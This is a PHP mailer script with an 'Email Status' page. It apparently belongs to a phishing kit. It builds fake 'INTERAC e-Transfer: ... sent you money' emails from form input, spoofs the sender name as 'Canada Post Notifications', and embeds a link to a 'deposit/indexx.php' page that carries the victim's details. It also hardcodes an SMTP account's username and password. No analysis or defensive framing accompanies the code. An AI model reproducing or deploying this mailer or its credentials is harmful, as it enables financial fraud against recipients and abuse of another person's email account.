<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require("phpmailer/src/PHPMailer.php");
require("phpmailer/src/SMTP.php");
require("phpmailer/src/Exception.php");

if (isset($_POST['submit'])) {
    // Create a placeholders array for replacement in the email template
    $placeholders = array(
        '{{etransfer_interac_ca}}' => $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST),
        '{{line}}' => date('F d, Y', strtotime('+30 days')),
        '{{username}}' => $_POST['username'],
        '{{photo_href}}' => $_POST['photo_href'],
        '{{bank}}' => $_POST['bank'],
        '{{amount}}' => $_POST['amount'],
        '{{photo_link}}' => $_POST['photo_link'],
        '{{link}}' => $_POST['link'],
        '{{EXPIRE}}' => $_POST['EXPIRE'],
        '{{expire}}' => $_POST['expire'],
        '{{link}}' => $_POST['link'],
        '{{sender_name}}' => $_POST['sender_name'],
        '{{memo}}' => $_POST['memo'],
        '{{receivers_name}}' => $_POST['receivers_name'],
        '{{receivers_email}}' => $_POST['receivers_email']
    );

    $message = file_get_contents('LEVEL1-3.html');
    $message = str_replace(array_keys($placeholders), array_values($placeholders), $message);

    $mail = new PHPMailer();
    $mail->IsSMTP();
    $mail->SMTPSecure = 'tls';
    $mail->Host = 'mail.mts.net'; // Use the provided host
    $mail->Port = 587; // The common SMTP port for TLS
    $mail->Body = $message;
    $mail->SMTPAuth = true;
    $mail->Username = 'andallard@mymts.net'; // Use the email address as the username
    $mail->Password = 'Batman123'; // Use the provided password
    $mail->SetFrom('andallard@mymts.net', 'Canada Post Notifications'); // Set From name to "Canada Post"
    $mail->AddAddress($_POST['receivers_email']);
    $mail->Subject = 'INTERAC e-Transfer: ' . $_POST['sender_name'] . ' sent you money';
    $mail->IsHTML(true);
    $mail->CharSet = "utf-8";

if (!$mail->send()) {
    $_SESSION['email_sent'] = false; // Email sending failed
} else {
    $_SESSION['email_sent'] = true; // Email sent successfully
}

}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Status</title>
    <style>
        /* Global styles */
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        /* Container styles */
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #333;
            border: 2px solid #555;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        /* Heading styles */
        .heading {
            font-size: 24px;
            font-weight: bold;
            color: red;
            margin-top: 20px;
        }

        /* Message styles */
        .message {
            font-size: 18px;
            margin-top: 20px;
        }

        /* Home button styles */
        .home-button {
            padding: 10px 20px;
            background-color: #FFD700;
            color: #333;
            text-decoration: none;
            font-size: 18px;
            margin-top: 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Heading -->
        <div class="heading">
            Email Status
        </div>

        <!-- Message based on session variable -->
        <div class="message">
            <?php
                session_start();
                if (isset($_SESSION['email_sent']) && $_SESSION['email_sent'] === true) {
                    echo "Your email has been sent successfully. Thank you for using our service.";
                } else {
                    echo "Failed to send the email. Please try again.";
                }
            ?>
        </div>

        <!-- Home button -->
        <a class="home-button" href="index.html">Back to Home</a>
    </div>
</body>
</html>
